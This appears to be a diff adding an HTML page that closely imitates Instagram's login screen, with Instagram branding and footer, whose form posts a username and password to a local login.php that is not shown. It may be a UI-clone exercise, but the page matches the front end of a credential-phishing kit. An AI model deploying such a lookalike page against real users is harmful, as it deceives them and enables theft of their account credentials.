@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="main-container">
+        <div class="left-section">
+            <img class="hero-image" src="insta-login.png" alt="Instagram App Screenshot">
+        </div>
+        <div class="right-section">
+            <div class="login-box">
+                <h1 class="instagram-logo">Instagram</h1>
+                <form method="POST" action="login.php">
+                    <input type="text" name="username" placeholder="Phone number, username, or email">
+                    <input type="password" name="password" placeholder="Password">
+                    <button type="submit" class="login-button">Log in</button>
+                </form>
+                <div class="divider">
+                    <div class="line"></div>
+                    <div class="or-text">OR</div>
+                    <div class="line"></div>
+                </div>
+                <a href="#" class="facebook-login">
+                    <i class="fab fa-facebook-square"></i>
+                    <span>Log in with Facebook</span>
+                </a>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+            <div class="signup-box">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-copyright">
+            <select aria-label="Switch Display Language">
+                <option value="en">English</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+            </select>
+            <span>© 2024 Instagram from Meta</span>
+        </div>
+    </footer>
+</body>
+</html>
